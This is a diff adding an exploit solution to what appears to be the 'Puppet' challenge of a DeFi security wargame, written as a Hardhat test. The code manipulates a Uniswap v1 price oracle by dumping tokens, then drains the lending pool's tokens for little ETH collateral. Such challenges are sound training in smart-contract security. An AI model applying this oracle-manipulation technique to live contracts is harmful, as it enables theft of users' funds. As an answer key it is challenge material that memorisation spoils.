@@ -103,6 +103,49 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Connect to the contracts with the attackers wallet
+        const attackPuppet = this.lendingPool.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackUniSwap = this.uniswapExchange.connect(attacker);
+
+        const getStats = async () => {
+            console.log("Attacker balance (DVL):", ethers.utils.formatEther(await attackToken.balanceOf(attacker.address)));
+            console.log("Attacker balance (ETH):", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+            console.log("Uniswap balance (DVL):", ethers.utils.formatEther(await this.token.balanceOf(this.uniswapExchange.address)));
+            console.log("Uniswap balance (ETH):", ethers.utils.formatEther(await ethers.provider.getBalance(this.uniswapExchange.address)));
+            console.log("Pool balance (DVL):", ethers.utils.formatEther(await this.token.balanceOf(this.lendingPool.address)));
+            console.log("Pool balance (ETH):", ethers.utils.formatEther(await ethers.provider.getBalance(this.lendingPool.address)));
+        };
+    
+        console.log("Initial state:");
+        await getStats();
+
+        // Approve token to swap with UniSwap
+        console.log("\n----------Approving Initial Balance----------");
+        await attackToken.approve(attackUniSwap.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        console.log("----------Balance approved----------");
+
+        console.log("----------Transferring tokens for ETH----------");
+        await attackUniSwap.tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), // minus by 1 so by the end of transact our value is greater than POOL_INITIAL_TOKEN_BALANCE
+            1, // Min return of ETH (doesn't matter the amount)
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+        )
+
+        console.log("\nAfter swapping of tokens:");
+        await getStats();
+        // Deposit ETH required to gain ALL tokens from the pool
+        const collateral = await attackPuppet.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("\nCollateral required:", ethers.utils.formatEther(collateral));
+        
+        await attackPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: collateral
+        })
+
+        console.log("\nAfter borrowing of tokens:");
+        await getStats();
+            
     });
 
     after(async function () {
